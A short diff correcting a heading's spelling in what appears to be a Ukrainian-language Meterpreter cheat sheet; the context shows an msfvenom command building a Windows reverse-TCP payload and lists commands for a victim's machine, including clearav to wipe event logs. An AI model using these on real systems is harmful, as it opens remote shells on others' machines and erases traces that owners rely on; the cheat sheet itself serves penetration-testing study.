@@ -40,7 +40,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -
 **rmdir** — видалити каталог в жертви.  
 **upload** — завантажити файл зі своєї системи на на поточну машину.  
 
-## Мережевы команди Meterpreter:
+## Мережеві команди Meterpreter:
 
 **clearav** — очищуэ журнал подый на комп'ютері жертви.  
 **execute** — виконує команду.  
